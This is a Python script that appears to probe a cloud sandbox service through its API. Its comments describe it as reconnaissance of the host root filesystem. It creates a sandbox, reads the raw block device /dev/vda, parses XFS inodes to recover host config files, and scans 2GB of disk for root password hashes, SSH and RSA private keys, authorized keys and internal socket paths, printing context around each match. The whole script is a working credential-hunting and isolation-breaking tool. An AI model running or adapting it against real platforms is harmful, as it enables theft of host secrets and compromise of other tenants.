# 实验J73: 宿主 rootfs (/dev/vda) 敏感数据侦察
# [1] xfs 工具可用性
# [2] inode local-format data fork 解析 (celld.toml 内容)
# [3] 前 2GB 模式扫描: shadow/ssh-key/authorized_keys/token
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj73"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re, struct, subprocess, time

print("== [1] xfs 工具可用性 ==", flush=True)
for tool in ["xfs_db", "xfs_info", "xfs_metadump", "xfs_repair", "debugfs", "lsblk", "blkid"]:
    r = subprocess.run(["which", tool], capture_output=True, text=True)
    print("  %s: %s" % (tool, r.stdout.strip() or "MISSING"), flush=True)

f = open("/dev/vda", "rb", buffering=0)
def be16(d, o): return struct.unpack_from(">H", d, o)[0]
def be32(d, o): return struct.unpack_from(">I", d, o)[0]
def be64(d, o): return struct.unpack_from(">Q", d, o)[0]

sb = f.read(512)
bs = be32(sb, 0x04)
agblocks = be32(sb, 0x54)
inodesize = be16(sb, 0x68)
inopblock = be16(sb, 0x6A)
inopblog = sb[0x7B]
agblklog = sb[0x7C]
shift = agblklog + inopblog
rootino = be64(sb, 0x38)
print("== [2] fs 参数 ==", flush=True)
print("bs=%d agblocks=%d inodesize=%d inopblock=%d rootino=%d" %
      (bs, agblocks, inodesize, inopblock, rootino), flush=True)

def inode_phys(ino):
    agno = ino >> shift
    agino = ino & ((1 << shift) - 1)
    agbno = agino >> inopblog
    inoff = (agino & (inopblock - 1)) * inodesize
    return agno * agblocks * bs + agbno * bs + inoff

print("== [3] inode 1042/1043/1044 data fork (0xB0 起) ==", flush=True)
for ino, label in [(1042, "DIR"), (1043, "celld.toml"), (1044, "xkernel.toml")]:
    p = inode_phys(ino)
    f.seek(p)
    d = f.read(inodesize)
    size = be64(d, 0x38)
    fmt = d[5]
    print("--- inode %d (%s) fmt=%d size=%d ---" % (ino, label, fmt, size), flush=True)
    # 尝试多个 fork 起点
    for fo in [0xB0, 0xB8, 0x98, 0xA0, 0x88]:
        chunk = d[fo:fo+size]
        if all(32 <= b < 127 or b in (9, 10, 13) for b in chunk[:min(size, 64)]):
            print("  fork@%#x ascii: %r" % (fo, chunk[:size][:300]), flush=True)
    # 前 400B hex 简览
    print("  d[0x60:0x100]: %s" % d[0x60:0x100].hex(), flush=True)

print("== [4] 前 2GB 敏感模式扫描 ==", flush=True)
PATS = [
    (b"root:$6$", "shadow-sha512"),
    (b"root:$y$", "shadow-yes"),
    (b"root:$1$", "shadow-md5"),
    (b"BEGIN OPENSSH PRIVATE KEY", "ssh-priv"),
    (b"BEGIN RSA PRIVATE KEY", "rsa-priv"),
    (b"BEGIN EC PRIVATE KEY", "ec-priv"),
    (b"ssh-ed25519 AAAA", "authorized-ed25519"),
    (b"ssh-rsa AAAA", "authorized-rsa"),
    (b"cell.sock", "cell-sock"),
    (b"/volumes/", "volumes-path"),
    (b"vercel", "vercel"),
]
hits = {t: [] for _, t in PATS}
LIMIT = 2 * 1024 * 1024 * 1024
CH = 8 * 1024 * 1024
t0 = time.time()
off = 0
while off < LIMIT:
    f.seek(off)
    d = f.read(CH)
    if not d:
        break
    for pat, tag in PATS:
        if tag == "vercel":
            continue
        for m in re.finditer(pat, d):
            hits[tag].append(off + m.start())
    off += len(d)
print("scan %.1fs done" % (time.time() - t0), flush=True)
for tag, lst in hits.items():
    uniq = sorted(set(lst))
    print("[%s] %d: %s" % (tag, len(uniq), uniq[:15]), flush=True)
    for u in uniq[:3]:
        f.seek(u)
        print("    ctx: %r" % f.read(160), flush=True)
f.close()
"""
run_cmd(sid, PROBE, "host-rootfs-recon", wait=True, timeout=400000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
